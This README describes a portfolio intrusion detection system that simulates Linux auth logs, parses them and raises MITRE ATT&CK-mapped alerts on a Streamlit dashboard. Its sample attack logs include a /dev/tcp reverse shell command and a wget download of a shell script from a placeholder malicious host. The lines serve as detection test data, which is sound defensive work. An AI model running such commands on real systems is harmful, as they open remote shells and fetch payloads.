# 🛡️ SENTINEL — Intrusion Detection System

![Status](https://img.shields.io/badge/status-active-brightgreen)
![Python](https://img.shields.io/badge/Python-3.11-3776AB?logo=python)
![SQLite](https://img.shields.io/badge/SQLite-3-003B57?logo=sqlite)
![Streamlit](https://img.shields.io/badge/Streamlit-deployed-FF4B4B?logo=streamlit)
![MITRE](https://img.shields.io/badge/MITRE%20ATT%26CK-mapped-red)

Real-time intrusion detection system that simulates Linux server logs, 
parses and normalizes security events, runs detection rules mapped to 
MITRE ATT&CK framework, and visualizes threats in a SOC-grade dashboard.

---

## 📐 Architecture
┌─────────────────────┐
│   Log Generator     │  Simulates /var/log/auth.log
│   SSH · sudo · auth │  Brute force · Priv escalation
└────────┬────────────┘
│
▼
┌─────────────────────┐
│   Log Parser        │  Regex patterns per event type
│   auth_parser.py    │  → Structured LogEvent objects
└────────┬────────────┘
│
▼
┌─────────────────────┐
│   Detection Engine  │  Rule-based threat detection
│   rules.py          │  MITRE ATT&CK mapped alerts
└────────┬────────────┘
│
▼
┌─────────────────────┐    ┌─────────────────────┐
│   SQLite Database   │    │   Streamlit SIEM     │
│   events + alerts   │───▶│   SOC Dashboard      │
└─────────────────────┘    └─────────────────────┘
---

## 🎯 Detection Rules

| Rule | Technique | MITRE ID | Severity |
|---|---|---|---|
| SSH Brute Force | Multiple failed logins from same IP | T1110 | CRITICAL |
| Suspicious Sudo | Commands matching post-exploitation patterns | T1548 | HIGH |
| Login After Failures | Successful login from IP with prior failures | T1078 | CRITICAL |

---

## 🛠️ Tech Stack

| Component | Technology |
|---|---|
| Log simulation | Python — `/var/log/auth.log` format |
| Parsing | Python + Regex |
| Detection engine | Python — SIGMA-style rules |
| Storage | SQLite |
| Dashboard | Streamlit + Plotly |

---

## 📁 Project Structure
siem-detection-system/
│
├── engine/
│   ├── log_generator.py      # Realistic Linux auth log simulator
│   ├── storage.py            # SQLite persistence layer
│   ├── parsers/
│   │   └── auth_parser.py    # Regex log parser → LogEvent objects
│   └── detectors/
│       └── rules.py          # Detection rules + Alert generation
│
├── dashboard/
│   └── app.py                # Streamlit SOC dashboard
│
├── data/
│   └── siem.db               # SQLite database (gitignored)
│
├── logs/
│   ├── raw/                  # Generated raw logs (gitignored)
│   └── processed/            # Parsed logs (gitignored)
│
└── tests/

---

## ⚙️ Technical Decisions

**Why SQLite over Elasticsearch?**  
For a portfolio project, SQLite provides identical query capabilities
without requiring a 3-container ELK stack. In production, the detection
logic is identical — only the storage backend changes. This keeps the
project fully reproducible on any machine.

**Why regex over log parsing libraries?**  
Writing regex patterns manually demonstrates understanding of log formats.
This is exactly what Logstash grok filters and Elastic Common Schema do
under the hood — just abstracted.

**Why MITRE ATT&CK mapping?**  
Every detection rule is mapped to a MITRE technique ID. This is the
industry standard for threat classification used by every SOC team globally.
It makes alerts actionable — an analyst knows immediately what playbook
to follow.

---

## 🚀 Local Setup

### Prerequisites
- Python 3.11+
- Git

### 1. Clone
```bash
git clone https://github.com/EmilianoMAl/siem-detection-system.git
cd siem-detection-system
```

### 2. Install dependencies
```bash
pip install streamlit plotly pandas
```

### 3. Generate logs
```bash
python -m engine.log_generator
```

### 4. Run full pipeline
```bash
python -m engine.storage
```

### 5. Launch dashboard
```bash
streamlit run dashboard/app.py
```

---

## 🔍 Simulated Attack Scenarios

**SSH Brute Force**
Apr 03 10:23:45 prod-server-01 sshd[4521]: Failed password for root from 94.102.49.190 port 52341 ssh2
Apr 03 10:23:46 prod-server-01 sshd[4522]: Failed password for root from 94.102.49.190 port 52342 ssh2
... (49 attempts)

**Reverse Shell via Sudo**
Apr 03 10:24:12 prod-server-01 sudo[4601]: deploy : COMMAND=/bin/bash -i >& /dev/tcp/45.33.32.156/4444 0>&1

**Malware Download**
Apr 03 10:24:15 prod-server-01 sudo[4602]: deploy : COMMAND=/usr/bin/wget http://malicious.com/shell.sh -O /tmp/shell.sh

---

## 🎓 Defensive Recommendations

Each alert includes an actionable recommendation:

- **Brute Force detected** → Block source IP at firewall, review if any attempt succeeded
- **Suspicious sudo** → Revoke sudo privileges temporarily, audit user activity
- **Login after failures** → Immediate account verification, force password reset

---

*Built by Emiliano — Data Engineering + Cybersecurity Portfolio*  
*Stack: Python · SQLite · Streamlit · MITRE ATT&CK Framework*